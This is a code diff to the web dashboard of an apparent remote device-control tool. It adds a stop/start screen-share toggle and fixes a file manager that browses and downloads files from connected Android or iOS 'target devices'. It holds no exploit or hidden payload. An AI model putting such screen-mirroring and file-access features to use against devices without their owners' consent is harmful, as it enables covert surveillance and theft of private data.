@@ -794,6 +794,9 @@
                 <button class="header-btn" onclick="requestMirrorRefresh()" title="Refresh Screen Mirror">
                     <span>🔄 Refresh Screen</span>
                 </button>
+                <button class="header-btn" id="btnToggleAndroidMirror" onclick="toggleAndroidScreenShare()" title="Turn Screen Share Off or On on the device" style="color: #f87171; border-color: rgba(248, 113, 113, 0.4);">
+                    <span id="androidMirrorBtnLabel">⏹️ Stop Screen Share</span>
+                </button>
             </div>
         </div>
 
@@ -1308,6 +1311,7 @@
         let fmCurrentAgentId = "";
 
         function openFileManagerModal(targetAgentOverride) {
+            const isNewTarget = (targetAgentOverride && targetAgentOverride !== fmCurrentAgentId);
             fmCurrentAgentId = targetAgentOverride || agentId;
             const modal = document.getElementById("fileManagerModal");
             if (modal) {
@@ -1318,7 +1322,9 @@
             if (titleEl) {
                 titleEl.innerText = `${isIosDevice ? '🍎 iOS Device Files' : 'Android File Manager'} — [${fmCurrentAgentId}]`;
             }
-            if (fmHistory.length === 0) {
+            if (isNewTarget || fmHistory.length === 0) {
+                fmHistory = [];
+                fmHistoryIndex = -1;
                 fmLoadDirectory(isIosDevice ? "/uploads" : "/storage/emulated/0", true);
             } else {
                 fmRefresh();
@@ -1354,14 +1360,14 @@
 
                 if (!res.ok) {
                     const err = await res.json().catch(() => ({}));
-                    showToast("Storage Error", err.msg || err.detail || "Unable to list directory", "error");
+                    showToast("Storage Error", err.error || err.msg || err.detail || "Unable to list directory", "error");
                     if (loading) loading.style.display = "none";
                     return;
                 }
 
                 const data = await res.json();
                 if (!data.success) {
-                    showToast("Access Denied", data.msg || "Cannot read storage directory", "error");
+                    showToast("Access Denied", data.error || data.msg || "Cannot read storage directory", "error");
                     if (loading) loading.style.display = "none";
                     return;
                 }
@@ -1379,7 +1385,7 @@
                 }
 
                 updateFmNavButtons();
-                fmCurrentEntries = data.entries || [];
+                fmCurrentEntries = data.entries || data.files || [];
                 renderFmEntries(fmCurrentEntries);
 
                 if (data.shortcuts && data.shortcuts.length > 0) {
@@ -1437,14 +1443,17 @@
             const row = document.getElementById("fmShortcutsRow");
             if (!row || !shortcuts) return;
             row.innerHTML = shortcuts.map(s => {
-                const icon = s.name.includes("Download") ? "📥" :
-                             s.name.includes("Document") ? "📄" :
-                             s.name.includes("Picture") ? "🖼️" :
-                             s.name.includes("DCIM") ? "📸" :
-                             s.name.includes("Music") ? "🎵" :
-                             s.name.includes("Internal") ? "📱" : "📂";
-                const safePath = (s.path || "").replace(/'/g, "\\'");
-                return `<button class="header-btn" onclick="fmGoToPath('${safePath}')" title="${s.path}">${icon} ${escapeHtml(s.name)}</button>`;
+                const name = (typeof s === 'string') ? s : (s.name || s.path);
+                const path = (typeof s === 'string') ? s : (s.path || "");
+                const icon = (s.icon) ? s.icon : (
+                             name.includes("Download") ? "📥" :
+                             name.includes("Document") ? "📄" :
+                             name.includes("Picture") ? "🖼️" :
+                             name.includes("DCIM") ? "📸" :
+                             name.includes("Music") ? "🎵" :
+                             name.includes("Internal") ? "📱" : "📂");
+                const safePath = (path || "").replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+                return `<button class="header-btn" onclick="fmGoToPath('${safePath}')" title="${path}">${icon} ${escapeHtml(name)}</button>`;
             }).join("");
         }
 
@@ -1503,10 +1512,10 @@
                 }
 
                 const icon = fmGetFileIcon(entry);
-                const safePath = (entry.path || "").replace(/'/g, "\\'");
-                const safeName = (entry.name || "").replace(/'/g, "\\'");
-                const sizeStr = entry.is_dir ? "—" : fmFormatSize(entry.size);
-                const dateStr = fmFormatDate(entry.last_modified);
+                const safePath = (entry.path || "").replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+                const safeName = (entry.name || "").replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+                const sizeStr = entry.is_dir ? "—" : (entry.size_fmt || fmFormatSize(entry.size));
+                const dateStr = entry.modified || (entry.last_modified ? fmFormatDate(entry.last_modified) : (entry.modified_ms ? fmFormatDate(entry.modified_ms / 1000) : "—"));
 
                 const rowClick = entry.is_dir ? `ondblclick="fmGoToPath('${safePath}')"` : `ondblclick="fmDownloadFile('${safePath}', '${safeName}')"`;
                 const cursorStyle = entry.is_dir ? 'cursor: pointer;' : 'cursor: default;';
@@ -2286,6 +2295,36 @@
 
         function requestMirrorRefresh() {
             if (viewerWs?.readyState === WebSocket.OPEN) viewerWs.send(JSON.stringify({ type: 'mirror_refresh' }));
+        }
+
+        let isAndroidMirrorActive = true;
+        function toggleAndroidScreenShare() {
+            const btn = document.getElementById("btnToggleAndroidMirror");
+            const label = document.getElementById("androidMirrorBtnLabel");
+            if (isAndroidMirrorActive) {
+                if (viewerWs?.readyState === WebSocket.OPEN) {
+                    viewerWs.send(JSON.stringify({ type: "stop_mirror" }));
+                }
+                isAndroidMirrorActive = false;
+                if (btn) {
+                    btn.style.color = "#34d399";
+                    btn.style.borderColor = "rgba(52, 211, 153, 0.4)";
+                }
+                if (label) label.textContent = "▶️ Start Screen Share";
+                showToast("Screen Share Stopped", "Remote screen sharing turned off on target device.", "info");
+            } else {
+                if (viewerWs?.readyState === WebSocket.OPEN) {
+                    viewerWs.send(JSON.stringify({ type: "start_mirror", transport: 2 }));
+                    requestMirrorRefresh();
+                }
+                isAndroidMirrorActive = true;
+                if (btn) {
+                    btn.style.color = "#f87171";
+                    btn.style.borderColor = "rgba(248, 113, 113, 0.4)";
+                }
+                if (label) label.textContent = "⏹️ Stop Screen Share";
+                showToast("Screen Share Resumed", "Live screen streaming active.", "success");
+            }
         }
 
         function setMirrorQuality() {
